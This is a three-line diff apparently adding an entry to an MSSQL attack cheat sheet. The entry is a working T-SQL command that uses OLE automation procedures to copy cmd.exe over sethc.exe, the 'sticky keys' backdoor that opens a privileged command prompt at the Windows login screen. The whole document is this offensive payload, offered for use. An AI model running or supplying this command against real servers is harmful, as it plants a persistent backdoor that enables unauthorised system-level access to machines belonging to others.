@@ -1,0 +1,3 @@
+
+- Copy file with OLE automation:
+declare @o int exec sp_oacreate 'scripting.filesystemobject', @o out exec sp_oamethod @o, 'copyfile',null,'c:\windows\system32\cmd.exe','c:\windows\system32\sethc.exe';
